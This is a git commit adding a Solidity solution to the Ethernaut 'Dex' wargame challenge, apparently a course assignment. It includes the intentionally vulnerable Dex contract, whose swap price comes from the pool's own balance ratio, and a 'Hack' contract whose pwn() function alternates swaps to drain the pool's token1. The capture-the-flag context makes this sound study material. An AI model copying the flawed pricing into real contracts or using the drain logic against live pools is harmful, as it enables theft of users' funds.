2551bcea7c6da8246786c26f2d93946b5697b556
Matt Zamora <mzamora2899@gmail.com>
2023-05-08 19:31:31 -0600

    ethernaut dex solution

---
+++ module-12/assignments/ethernaut/src/Dex.sol
@@ -0,0 +1,116 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "openzeppelin-contracts/token/ERC20/IERC20.sol";
+import "openzeppelin-contracts/token/ERC20/ERC20.sol";
+import "openzeppelin-contracts/access/Ownable.sol";
+
+contract Dex is Ownable {
+    address public token1;
+    address public token2;
+
+    constructor() {}
+
+    function setTokens(address _token1, address _token2) public onlyOwner {
+        token1 = _token1;
+        token2 = _token2;
+    }
+
+    function addLiquidity(address token_address, uint amount) public onlyOwner {
+        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+    }
+
+    function swap(address from, address to, uint amount) public {
+        require(
+            (from == token1 && to == token2) ||
+                (from == token2 && to == token1),
+            "Invalid tokens"
+        );
+        require(
+            IERC20(from).balanceOf(msg.sender) >= amount,
+            "Not enough to swap"
+        );
+        uint swapAmount = getSwapPrice(from, to, amount);
+        IERC20(from).transferFrom(msg.sender, address(this), amount);
+        IERC20(to).approve(address(this), swapAmount);
+        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+    }
+
+    function getSwapPrice(
+        address from,
+        address to,
+        uint amount
+    ) public view returns (uint) {
+        return ((amount * IERC20(to).balanceOf(address(this))) /
+            IERC20(from).balanceOf(address(this)));
+    }
+
+    function approve(address spender, uint amount) public {
+        SwappableToken(token1).approve(msg.sender, spender, amount);
+        SwappableToken(token2).approve(msg.sender, spender, amount);
+    }
+
+    function balanceOf(
+        address token,
+        address account
+    ) public view returns (uint) {
+        return IERC20(token).balanceOf(account);
+    }
+}
+
+contract SwappableToken is ERC20 {
+    address private _dex;
+
+    constructor(
+        address dexInstance,
+        string memory name,
+        string memory symbol,
+        uint256 initialSupply
+    ) ERC20(name, symbol) {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+    }
+
+    function approve(address owner, address spender, uint256 amount) public {
+        require(owner != _dex, "InvalidApprover");
+        super._approve(owner, spender, amount);
+    }
+}
+
+contract Hack {
+    IDex private immutable dex;
+    IERC20 private immutable token1;
+    IERC20 private immutable token2;
+
+    constructor(Dex _dex) {
+        dex = _dex;
+        token1 = IERC20(dex.token1());
+        token2 = IERC20(dex.token2());
+    }
+
+    function pwn() external {
+        token1.transferFrom(msg.sender, address(this), 10);
+        token2.transferFrom(msg.sender, address(this), 10);
+
+        token1.approve(address(dex), type(uint256).max);
+        token2.approve(address(dex), type(uint256).max);
+
+        _swap(token1, token2);
+        _swap(token2, token1);
+        _swap(token1, token2);
+        _swap(token2, token1);
+        _swap(token1, token2);
+
+        dex.swap(address(token2), address(token1), 45);
+
+        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
+    }
+
+    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
+        dex.swap(
+            address(tokenIn),
+            address(tokenOut),
+            tokenIn.balanceOf(address(this))
+        );
+    }
+}
